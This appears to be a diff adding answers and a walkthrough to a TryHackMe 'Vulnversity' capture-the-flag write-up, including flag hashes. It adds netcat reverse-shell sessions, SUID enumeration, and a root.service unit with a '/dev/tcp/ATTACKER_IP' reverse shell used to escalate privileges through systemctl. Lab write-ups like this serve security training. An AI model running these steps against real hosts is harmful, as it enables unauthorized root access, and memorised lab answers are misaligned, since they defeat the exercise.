@@ -191,19 +191,15 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 <summary>Reveal Flag <span data-gb-custom-inline data-tag="emoji" data-code="1f6a9">🚩</span></summary>
 
-:triangular\_flag\_on\_post:
+:triangular\_flag\_on\_post:`.php`
 
 </details>
 
-### To identify which extensions are not blocked, we're going to fuzz the upload form. To do this, we're going to use **BurpSuite.** If you are unsure to what BurpSuite is, or how to set it up please complete our [BurpSuite room](https://tryhackme.com/room/rpburpsuite) first.
+### To identify which extensions are not blocked, we're going to fuzz the upload form. To do this, we're going to use **BurpSuite.** If you are unsure to what BurpSuite is, or how to set it up please complete our [BurpSuite room](../difficulty-info/burp-suite/) first.
 
-<details>
-
-<summary>Reveal Flag <span data-gb-custom-inline data-tag="emoji" data-code="1f6a9">🚩</span></summary>
-
-:triangular\_flag\_on\_post:``
-
-</details>
+{% hint style="success" %}
+No answer needed
+{% endhint %}
 
 ### Run this attack, what extension is allowed?
 
@@ -211,7 +207,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 <summary>Reveal Flag <span data-gb-custom-inline data-tag="emoji" data-code="1f6a9">🚩</span></summary>
 
-:triangular\_flag\_on\_post:``
+:triangular\_flag\_on\_post:`.phtml`
 
 </details>
 
@@ -223,11 +219,29 @@ No answer needed
 
 ### What is the name of the user who manages the webserver?
 
+```
+nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.9.12.198] from (UNKNOWN) [10.10.86.148] 45426
+Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 21:03:07 up 54 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+bash: cannot set terminal process group (1345): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@vulnuniversity:/$ 
+```
+
+```
+www-data@vulnuniversity:/home$ ls
+bill
+```
+
 <details>
 
 <summary>Reveal Flag <span data-gb-custom-inline data-tag="emoji" data-code="1f6a9">🚩</span></summary>
 
-:triangular\_flag\_on\_post:``
+:triangular\_flag\_on\_post:`bill`
 
 </details>
 
@@ -237,11 +251,17 @@ No answer needed
 **HINT:** The contents of the file /home/bill/user.txt
 {% endhint %}
 
+```
+www-data@vulnuniversity:/home/bill$ cat user.txt
+cat user.txt
+(reveal flag below)
+```
+
 <details>
 
 <summary>Reveal Flag <span data-gb-custom-inline data-tag="emoji" data-code="1f6a9">🚩</span></summary>
 
-:triangular\_flag\_on\_post:``
+:triangular\_flag\_on\_post:`8bd7992fbe8a6ad22a63361004cfcedb`
 
 </details>
 
@@ -253,11 +273,44 @@ No answer needed
 **HINT:** Use the command: find / -user root -perm -4000 -exec ls -ldb {} ;
 {% endhint %}
 
+```
+find / -perm -u=s -type f 2>/dev/null
+```
+
+```
+/usr/bin/newuidmap
+/usr/bin/chfn
+/usr/bin/newgidmap
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/at
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/squid/pinger
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/bin/su
+/bin/ntfs-3g
+/bin/mount
+/bin/ping6
+/bin/umount
+/bin/systemctl
+/bin/ping
+/bin/fusermount
+/sbin/mount.cifs
+```
+
 <details>
 
 <summary>Reveal Flag <span data-gb-custom-inline data-tag="emoji" data-code="1f6a9">🚩</span></summary>
 
-:triangular\_flag\_on\_post:``
+:triangular\_flag\_on\_post:`/bin/systemctl`
 
 </details>
 
@@ -267,11 +320,106 @@ No answer needed
 **HINT:** /bin/systemctl
 {% endhint %}
 
+{% embed url="https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49" %}
+[https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49](https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49)
+{% endembed %}
+
+Find a directory that www-data can write to:
+
+```
+find / -type f -maxdepth 2 -writable
+find / -type d -maxdepth 2 -writable
+```
+
+```
+www-data@vulnuniversity:/tmp$ find / -type d -maxdepth 2 -writable
+find / -type d -maxdepth 2 -writable
+/run/php
+/run/lock
+find: '/lost+found': Permission denied
+/var/tmp
+/var/crash
+/tmp
+/tmp/.font-unix
+/tmp/.ICE-unix
+/tmp/.X11-unix
+/tmp/.XIM-unix
+/tmp/.Test-unix
+/dev/mqueue
+/dev/shm
+```
+
+Create a `root.service` file on your attack machine:
+
+```
+[Unit]
+Description=rootservice
+
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/9999 0>&1'
+
+[Install]
+WantedBy=multi-user.target
+
+```
+
+Get the target to listen for a connection to receive and write the `root.service` file to /tmp:
+
+```
+www-data@vulnuniversity:$ cd /tmp
+www-data@vulnuniversity:/tmp$ nc -vl 6969 > root.service
+```
+
+Send the file from your attack machine to the target:
+
+```
+kali@kali  ~/Documents/THM/vulnversity  nc -n TARGET_IP 6969 < root.service
+```
+
+Then start a new listener to capture the root reverse shell:
+
+```
+kali@kali  ~/Documents/THM/vulnversity  nc -lvnp 9999
+```
+
+Execute the payload:
+
+```
+www-data@vulnuniversity:/tmp$ /bin/systemctl enable /tmp/root.service
+Created symlink from /etc/systemd/system/multi-user.target.wants/root.service to /tmp/root.service.
+Created symlink from /etc/systemd/system/root.service to /tmp/root.service.
+```
+
+```
+www-data@vulnuniversity:/tmp$ /bin/systemctl start root
+```
+
+Catch the root reverse shell on your attack machine:
+
+```
+kali@kali  ~/Documents/THM/vulnversity  nc -lvnp 9999                          
+listening on [any] 9999 ...
+connect to [10.9.12.198] from (UNKNOWN) [10.10.86.148] 45598
+bash: cannot set terminal process group (2162): Inappropriate ioctl for device
+bash: no job control in this shell
+root@vulnuniversity:/# whoami
+root
+```
+
+Read the root flag:
+
+```
+root@vulnuniversity:~# cat /root/root.txt
+cat root.txt
+(reveal flag below)
+```
+
 <details>
 
 <summary>Reveal Flag <span data-gb-custom-inline data-tag="emoji" data-code="1f6a9">🚩</span></summary>
 
-:triangular\_flag\_on\_post:``
+:triangular\_flag\_on\_post:`a58ff8579f0a9270368d33a9966c7fd5`
 
 </details>
-
